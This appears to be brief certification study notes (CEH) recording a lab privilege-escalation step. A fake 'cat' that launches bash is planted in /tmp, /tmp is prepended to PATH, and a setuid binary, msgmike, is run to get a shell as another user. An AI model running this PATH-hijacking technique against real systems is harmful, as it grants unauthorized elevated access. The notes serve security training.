# CEH-Notes
CEH notes


to prev esc to mike :


exec: file msgmike

msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=60bf769f8fbbfd406c047f698b55d2668fae14d3, not stripped

echo "/bin/bash" > /tmp/cat
cd tmp/
chmod +x cat
export PATH=/tmp:$PATH 

cd home/kane
./msgmike
